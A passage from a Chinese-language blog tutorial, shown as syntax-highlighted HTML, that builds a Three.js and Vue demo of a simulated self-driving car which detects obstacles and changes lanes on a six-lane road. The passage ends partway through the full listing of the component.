<span class="hljs-keyword">const</span> wheelGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">CylinderGeometry</span>(<span class="hljs-number">0.3</span>, <span class="hljs-number">0.3</span>, <span class="hljs-number">0.2</span>, <span class="hljs-number">16</span>)
<span class="hljs-comment">// ... </span>
carGroup.<span class="hljs-title function_">add</span>(wheel)
<span class="hljs-comment">// 将车辆添加到画布</span>
scene.<span class="hljs-title function_">add</span>(carGroup)
</code></pre>
<p>这里需要注意，主体车辆行驶过程中需要增加跟随。</p>
<pre><code class="hljs language-js" lang="js">camera = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PerspectiveCamera</span>(<span class="hljs-number">75</span>, rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-property">clientWidth</span> / rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-property">clientHeight</span>, <span class="hljs-number">0.1</span>, <span class="hljs-number">1000</span>)
<span class="hljs-comment">// 第三人称跟随视角</span>
camera.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>, -<span class="hljs-number">15</span>)
camera.<span class="hljs-title function_">lookAt</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
</code></pre>
<h3 data-id="heading-4">创建障碍物</h3>
<p>基本与创建车辆类似，但是是随机在车道上进行创建障碍物。</p>
<p>另外如果是车辆的话增加一个行驶速度。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obstacle = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Group</span>()
    
<span class="hljs-comment">// 主体</span>
<span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BoxGeometry</span>(type.<span class="hljs-property">size</span>.<span class="hljs-property">w</span>, type.<span class="hljs-property">size</span>.<span class="hljs-property">h</span>, type.<span class="hljs-property">size</span>.<span class="hljs-property">d</span>)
<span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: type.<span class="hljs-property">color</span> })
<span class="hljs-keyword">const</span> body = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(geometry, material)
obstacle.<span class="hljs-title function_">add</span>(body)

<span class="hljs-comment">// 随机位置（6车道系统，增加间距）</span>
<span class="hljs-keyword">const</span> lanes = [-<span class="hljs-number">10</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>] <span class="hljs-comment">// 6个车道的中心位置</span>
<span class="hljs-keyword">const</span> lane = lanes[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * lanes.<span class="hljs-property">length</span>)]
obstacle.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(lane, <span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">60</span> + <span class="hljs-number">20</span>) <span class="hljs-comment">// 增加生成距离</span>

<span class="hljs-comment">// 添加移动速度</span>
obstacle.<span class="hljs-property">userData</span> = {
    <span class="hljs-attr">speed</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">0.02</span> + <span class="hljs-number">0.01</span>,
    <span class="hljs-attr">type</span>: type.<span class="hljs-property">type</span>
}
</code></pre>
<h3 data-id="heading-5">障碍物检测 &amp; 寻找安全车道</h3>
<p>障碍物的检测和寻找安全车道效果基本上相同，都是在前后距离范围内检测是否存在障碍物，如果存在那么就认定障碍物检测成功。</p>
<p>如果当前车道存在，而其他车道不存在，则认定其他车道为安全车道。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 检查是否在同一车道且在前方</span>
<span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(obstacleX - carX) &lt; <span class="hljs-number">1.5</span> &amp;&amp; <span class="hljs-comment">// 同一车道范围</span>
    obstacleZ &gt; carZ &amp;&amp; <span class="hljs-comment">// 在前方</span>
    obstacleZ - carZ &lt; detectionDistance) { <span class="hljs-comment">// 在检测距离内</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
}
</code></pre>
<h3 data-id="heading-6">车道变换效果</h3>
<p>这里需要注意，变换车道效果0.5s即完成，尤其是提示部分。</p>
<p>如果是实际项目此处应该配合真正的传感器和计算完成时间计算。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> deltaX = targetX - currentX
<span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(deltaX) &gt; <span class="hljs-number">0.1</span>) {
    car.<span class="hljs-property">position</span>.<span class="hljs-property">x</span> += <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sign</span>(deltaX) * laneChangeSpeed
} <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 变道完成</span>
    car.<span class="hljs-property">position</span>.<span class="hljs-property">x</span> = targetX
    currentLane = targetLane
    
    <span class="hljs-comment">// 0.5秒后重置状态</span>
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-keyword">if</span> (!isChangingLane) {
            laneChangeStatus.<span class="hljs-property">value</span> = <span class="hljs-string">'正常行驶'</span>
        }
    }, <span class="hljs-number">500</span>)
}
</code></pre>
<p>其他部分就没什么了，主要是运行过程中需要循环进行变道、道路标线的更新、障碍物的更新。</p>
<p>当然，我推荐你在卸载页面的时候释放掉资源。不释放也没啥太大影响倒是。</p>
<h2 data-id="heading-7">全部代码</h2>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"car-three"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"rendererCanvas"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"controls"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"speed-info"</span>&gt;</span>速度: {{ speed.toFixed(1) }} km/h<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"obstacle-count"</span>&gt;</span>障碍物数量: {{ obstacleCount }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"lane-info"</span>&gt;</span>当前车道: {{ currentLaneDisplay }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"lane-change-status"</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"{ active: isChangingLaneDisplay }"</span>&gt;</span>
                {{ laneChangeStatus }}
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-variable constant_">THREE</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'three'</span>;
<span class="hljs-keyword">import</span> { ref, onMounted, onBeforeUnmount } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> rendererCanvas = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)
<span class="hljs-keyword">const</span> speed = <span class="hljs-title function_">ref</span>(<span class="hljs-number">60</span>) <span class="hljs-comment">// 车速 km/h</span>
<span class="hljs-keyword">const</span> obstacleCount = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)
<span class="hljs-keyword">const</span> currentLaneDisplay = <span class="hljs-title function_">ref</span>(<span class="hljs-number">3</span>) <span class="hljs-comment">// 显示用的车道号（1-6）</span>
<span class="hljs-keyword">const</span> isChangingLaneDisplay = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)
<span class="hljs-keyword">const</span> laneChangeStatus = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'正常行驶'</span>)

<span class="hljs-keyword">let</span> scene, camera, renderer
<span class="hljs-keyword">let</span> car, road, obstacles = []
<span class="hljs-keyword">let</span> clock = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Clock</span>()

<span class="hljs-comment">// 车辆控制</span>
<span class="hljs-keyword">let</span> carSpeed = <span class="hljs-number">0.05</span>
<span class="hljs-keyword">let</span> roadOffset = <span class="hljs-number">0</span>
<span class="hljs-keyword">let</span> currentLane = <span class="hljs-number">2</span> <span class="hljs-comment">// 当前车道索引（0-5对应6个车道）</span>
<span class="hljs-keyword">let</span> targetLane = <span class="hljs-number">2</span> <span class="hljs-comment">// 目标车道索引</span>
<span class="hljs-keyword">let</span> isChangingLane = <span class="hljs-literal">false</span> <span class="hljs-comment">// 是否正在变道</span>
<span class="hljs-keyword">let</span> laneChangeSpeed = <span class="hljs-number">0.02</span> <span class="hljs-comment">// 变道速度</span>

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">initScene</span>()
    <span class="hljs-title function_">createRoad</span>()
    <span class="hljs-title function_">createCar</span>()
    <span class="hljs-title function_">createObstacles</span>()
    <span class="hljs-title function_">setupCamera</span>()
    <span class="hljs-title function_">animate</span>()
})

<span class="hljs-keyword">const</span> <span class="hljs-title function_">initScene</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// 初始化场景</span>
    scene = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Scene</span>()
    scene.<span class="hljs-property">background</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Color</span>(<span class="hljs-number">0xE8E8E8</span>) <span class="hljs-comment">// 灰白色背景</span>
    
    <span class="hljs-comment">// 创建渲染器</span>
    renderer = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">WebGLRenderer</span>({ <span class="hljs-attr">antialias</span>: <span class="hljs-literal">true</span> })
    renderer.<span class="hljs-title function_">setSize</span>(rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-property">clientWidth</span>, rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-property">clientHeight</span>)
    renderer.<span class="hljs-title function_">setPixelRatio</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">devicePixelRatio</span>)
    renderer.<span class="hljs-property">shadowMap</span>.<span class="hljs-property">enabled</span> = <span class="hljs-literal">false</span> <span class="hljs-comment">// 避免proxy错误</span>
    rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-title function_">appendChild</span>(renderer.<span class="hljs-property">domElement</span>)
    
    <span class="hljs-comment">// 添加环境光</span>
    <span class="hljs-comment">// const ambientLight = new THREE.AmbientLight(0xffffff, 0.8)</span>
    <span class="hljs-comment">// scene.add(ambientLight)</span>
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">createRoad</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// 创建道路（6车道）</span>
    <span class="hljs-keyword">const</span> roadGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PlaneGeometry</span>(<span class="hljs-number">24</span>, <span class="hljs-number">200</span>)
    <span class="hljs-keyword">const</span> roadMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0x555555</span> })
    road = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(roadGeometry, roadMaterial)
    road.<span class="hljs-property">rotation</span>.<span class="hljs-property">x</span> = -<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">2</span>
    scene.<span class="hljs-title function_">add</span>(road)
    
    <span class="hljs-comment">// 创建车道标线</span>
    <span class="hljs-keyword">const</span> lineGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PlaneGeometry</span>(<span class="hljs-number">0.15</span>, <span class="hljs-number">2</span>)
    <span class="hljs-keyword">const</span> lineMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0xffffff</span> })
    <span class="hljs-keyword">const</span> dashedLineMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0xffffff</span> })
    
    <span class="hljs-comment">// 车道分隔线（虚线）- 创建多个短线段</span>
    <span class="hljs-keyword">const</span> lanePositions = [-<span class="hljs-number">8</span>, -<span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>] <span class="hljs-comment">// 5条车道分隔线，形成6个车道</span>
    
    lanePositions.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> {
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = -<span class="hljs-number">50</span>; i &lt; <span class="hljs-number">50</span>; i += <span class="hljs-number">4</span>) { <span class="hljs-comment">// 虚线间隔</span>
            <span class="hljs-keyword">const</span> line = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(lineGeometry, dashedLineMaterial)
            line.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(x, <span class="hljs-number">0.01</span>, i)
            line.<span class="hljs-property">rotation</span>.<span class="hljs-property">x</span> = -<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">2</span>
            scene.<span class="hljs-title function_">add</span>(line)
        }
    })
    
    <span class="hljs-comment">// 道路边界线（实线）</span>
    <span class="hljs-keyword">const</span> borderGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PlaneGeometry</span>(<span class="hljs-number">0.2</span>, <span class="hljs-number">200</span>)
    <span class="hljs-keyword">const</span> leftBorder = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(borderGeometry, lineMaterial)
    leftBorder.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(-<span class="hljs-number">12</span>, <span class="hljs-number">0.01</span>, <span class="hljs-number">0</span>)
    leftBorder.<span class="hljs-property">rotation</span>.<span class="hljs-property">x</span> = -<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">2</span>
    scene.<span class="hljs-title function_">add</span>(leftBorder)
    
    <span class="hljs-keyword">const</span> rightBorder = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(borderGeometry, lineMaterial)
    rightBorder.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">12</span>, <span class="hljs-number">0.01</span>, <span class="hljs-number">0</span>)
    rightBorder.<span class="hljs-property">rotation</span>.<span class="hljs-property">x</span> = -<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">2</span>
    scene.<span class="hljs-title function_">add</span>(rightBorder)
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">createCar</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// 创建主车（简化的车辆模型）</span>
    <span class="hljs-keyword">const</span> carGroup = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Group</span>()
    
    <span class="hljs-comment">// 车身</span>
    <span class="hljs-keyword">const</span> bodyGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BoxGeometry</span>(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>)
    <span class="hljs-keyword">const</span> bodyMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0x87CEEB</span> }) <span class="hljs-comment">// 浅蓝色主车</span>
    <span class="hljs-keyword">const</span> body = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(bodyGeometry, bodyMaterial)
    body.<span class="hljs-property">position</span>.<span class="hljs-property">y</span> = <span class="hljs-number">0.5</span>
    carGroup.<span class="hljs-title function_">add</span>(body)
    
    <span class="hljs-comment">// 车窗</span>
    <span class="hljs-keyword">const</span> windowGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BoxGeometry</span>(<span class="hljs-number">1.8</span>, <span class="hljs-number">0.8</span>, <span class="hljs-number">2</span>)
    <span class="hljs-keyword">const</span> windowMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0xE8E8E8</span>, <span class="hljs-attr">transparent</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">opacity</span>: <span class="hljs-number">0.5</span> })
    <span class="hljs-keyword">const</span> <span class="hljs-variable language_">window</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(windowGeometry, windowMaterial)
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">position</span>.<span class="hljs-property">y</span> = <span class="hljs-number">1.2</span>
    carGroup.<span class="hljs-title function_">add</span>(<span class="hljs-variable language_">window</span>)
    
    <span class="hljs-comment">// 车轮</span>
    <span class="hljs-keyword">const</span> wheelGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">CylinderGeometry</span>(<span class="hljs-number">0.3</span>, <span class="hljs-number">0.3</span>, <span class="hljs-number">0.2</span>, <span class="hljs-number">16</span>)
    <span class="hljs-keyword">const</span> wheelMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0x222222</span> })
    
    <span class="hljs-keyword">const</span> wheels = [
        { <span class="hljs-attr">x</span>: -<span class="hljs-number">0.8</span>, <span class="hljs-attr">z</span>: <span class="hljs-number">1.2</span> },
        { <span class="hljs-attr">x</span>: <span class="hljs-number">0.8</span>, <span class="hljs-attr">z</span>: <span class="hljs-number">1.2</span> },
        { <span class="hljs-attr">x</span>: -<span class="hljs-number">0.8</span>, <span class="hljs-attr">z</span>: -<span class="hljs-number">1.2</span> },
        { <span class="hljs-attr">x</span>: <span class="hljs-number">0.8</span>, <span class="hljs-attr">z</span>: -<span class="hljs-number">1.2</span> }
    ]
    
    wheels.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">pos</span> =&gt;</span> {
        <span class="hljs-keyword">const</span> wheel = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(wheelGeometry, wheelMaterial)
        wheel.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(pos.<span class="hljs-property">x</span>, <span class="hljs-number">0.3</span>, pos.<span class="hljs-property">z</span>)
        wheel.<span class="hljs-property">rotation</span>.<span class="hljs-property">z</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">2</span>
        carGroup.<span class="hljs-title function_">add</span>(wheel)
    })
    
    car = carGroup
    car.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(-<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">5</span>) <span class="hljs-comment">// 主车位于右侧车道</span>
    scene.<span class="hljs-title function_">add</span>(car)
}

<span class="hljs-comment">// 检测前方障碍物</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">detectFrontObstacle</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> carX = car.<span class="hljs-property">position</span>.<span class="hljs-property">x</span>
    <span class="hljs-keyword">const</span> carZ = car.<span class="hljs-property">position</span>.<span class="hljs-property">z</span>
    <span class="hljs-keyword">const</span> detectionDistance = <span class="hljs-number">15</span> <span class="hljs-comment">// 检测距离</span>
    <span class="hljs-keyword">const</span> laneWidth = <span class="hljs-number">4</span> <span class="hljs-comment">// 车道宽度</span>
    
    <span class="hljs-comment">// 检查前方是否有障碍物</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> obstacle <span class="hljs-keyword">of</span> obstacles) {
        <span class="hljs-keyword">const</span> obstacleX = obstacle.<span class="hljs-property">position</span>.<span class="hljs-property">x</span>
        <span class="hljs-keyword">const</span> obstacleZ = obstacle.<span class="hljs-property">position</span>.<span class="hljs-property">z</span>
        
        <span class="hljs-comment">// 检查是否在同一车道且在前方</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(obstacleX - carX) &lt; <span class="hljs-number">1.5</span> &amp;&amp; <span class="hljs-comment">// 同一车道范围</span>
            obstacleZ &gt; carZ &amp;&amp; <span class="hljs-comment">// 在前方</span>
            obstacleZ - carZ &lt; detectionDistance) { <span class="hljs-comment">// 在检测距离内</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
}

<span class="hljs-comment">// 寻找安全车道</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">findSafeLane</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> lanes = [-<span class="hljs-number">10</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>] <span class="hljs-comment">// 6个车道位置</span>
    <span class="hljs-keyword">const</span> carZ = car.<span class="hljs-property">position</span>.<span class="hljs-property">z</span>
    <span class="hljs-keyword">const</span> checkDistance = <span class="hljs-number">20</span> <span class="hljs-comment">// 安全检查距离</span>
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; lanes.<span class="hljs-property">length</span>; i++) {
        <span class="hljs-keyword">if</span> (i === currentLane) <span class="hljs-keyword">continue</span> <span class="hljs-comment">// 跳过当前车道</span>
        
        <span class="hljs-keyword">let</span> isSafe = <span class="hljs-literal">true</span>
        <span class="hljs-keyword">const</span> laneX = lanes[i]
        
        <span class="hljs-comment">// 检查这个车道是否安全</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> obstacle <span class="hljs-keyword">of</span> obstacles) {
            <span class="hljs-keyword">const</span> obstacleX = obstacle.<span class="hljs-property">position</span>.<span class="hljs-property">x</span>
            <span class="hljs-keyword">const</span> obstacleZ = obstacle.<span class="hljs-property">position</span>.<span class="hljs-property">z</span>
            
            <span class="hljs-comment">// 检查前后一定距离内是否有障碍物</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(obstacleX - laneX) &lt; <span class="hljs-number">1.5</span> &amp;&amp; <span class="hljs-comment">// 在目标车道</span>
                <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(obstacleZ - carZ) &lt; checkDistance) { <span class="hljs-comment">// 在安全检查范围内</span>
                isSafe = <span class="hljs-literal">false</span>
                <span class="hljs-keyword">break</span>
            }
        }
        
        <span class="hljs-keyword">if</span> (isSafe) {
            <span class="hljs-keyword">return</span> i <span class="hljs-comment">// 返回安全车道索引</span>
        }
    }
    
    <span class="hljs-keyword">return</span> currentLane <span class="hljs-comment">// 如果没有安全车道，保持当前车道</span>
}

<span class="hljs-comment">// 执行车道变换</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">performLaneChange</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (isChangingLane) {
        <span class="hljs-keyword">const</span> lanes = [-<span class="hljs-number">10</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>]
        <span class="hljs-keyword">const</span> targetX = lanes[targetLane]
        <span class="hljs-keyword">const</span> currentX = car.<span class="hljs-property">position</span>.<span class="hljs-property">x</span>
        
        <span class="hljs-comment">// 平滑移动到目标车道</span>
        <span class="hljs-keyword">const</span> deltaX = targetX - currentX
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(deltaX) &gt; <span class="hljs-number">0.1</span>) {
            car.<span class="hljs-property">position</span>.<span class="hljs-property">x</span> += <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sign</span>(deltaX) * laneChangeSpeed
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 变道完成</span>
            car.<span class="hljs-property">position</span>.<span class="hljs-property">x</span> = targetX
            currentLane = targetLane
            isChangingLane = <span class="hljs-literal">false</span>
            laneChangeStatus.<span class="hljs-property">value</span> = <span class="hljs-string">'变道完成'</span>
            isChangingLaneDisplay.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
            
            <span class="hljs-comment">// 0.5秒后重置状态</span>
            <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                <span class="hljs-keyword">if</span> (!isChangingLane) {
                    laneChangeStatus.<span class="hljs-property">value</span> = <span class="hljs-string">'正常行驶'</span>
                }
            }, <span class="hljs-number">500</span>)
        }
    }
    
    <span class="hljs-comment">// 更新显示的车道号</span>
    currentLaneDisplay.<span class="hljs-property">value</span> = currentLane + <span class="hljs-number">1</span> <span class="hljs-comment">// 车道号从1开始</span>
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">createObstacles</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// 创建随机障碍物（统一灰白色）</span>
    <span class="hljs-keyword">const</span> obstacleTypes = [
        { <span class="hljs-attr">type</span>: <span class="hljs-string">'car'</span>, <span class="hljs-attr">color</span>: <span class="hljs-number">0xD3D3D3</span>, <span class="hljs-attr">size</span>: { <span class="hljs-attr">w</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">h</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">d</span>: <span class="hljs-number">4</span> } },
        { <span class="hljs-attr">type</span>: <span class="hljs-string">'car'</span>, <span class="hljs-attr">color</span>: <span class="hljs-number">0xC0C0C0</span>, <span class="hljs-attr">size</span>: { <span class="hljs-attr">w</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">h</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">d</span>: <span class="hljs-number">4</span> } },
        { <span class="hljs-attr">type</span>: <span class="hljs-string">'truck'</span>, <span class="hljs-attr">color</span>: <span class="hljs-number">0xB8B8B8</span>, <span class="hljs-attr">size</span>: { <span class="hljs-attr">w</span>: <span class="hljs-number">2.5</span>, <span class="hljs-attr">h</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">d</span>: <span class="hljs-number">6</span> } },
        { <span class="hljs-attr">type</span>: <span class="hljs-string">'pedestrian'</span>, <span class="hljs-attr">color</span>: <span class="hljs-number">0xA8A8A8</span>, <span class="hljs-attr">size</span>: { <span class="hljs-attr">w</span>: <span class="hljs-number">0.5</span>, <span class="hljs-attr">h</span>: <span class="hljs-number">1.7</span>, <span class="hljs-attr">d</span>: <span class="hljs-number">0.5</span> } }
    ]
    
    <span class="hljs-comment">// 创建初始障碍物（减少数量）</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) {
        <span class="hljs-title function_">createRandomObstacle</span>(obstacleTypes)
    }
    
    obstacleCount.<span class="hljs-property">value</span> = obstacles.<span class="hljs-property">length</span>
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">createRandomObstacle</span> = (<span class="hljs-params">types</span>) =&gt; {
    <span class="hljs-keyword">const</span> type = types[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * types.<span class="hljs-property">length</span>)]
    <span class="hljs-keyword">const</span> obstacle = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Group</span>()
    
    <span class="hljs-comment">// 主体</span>
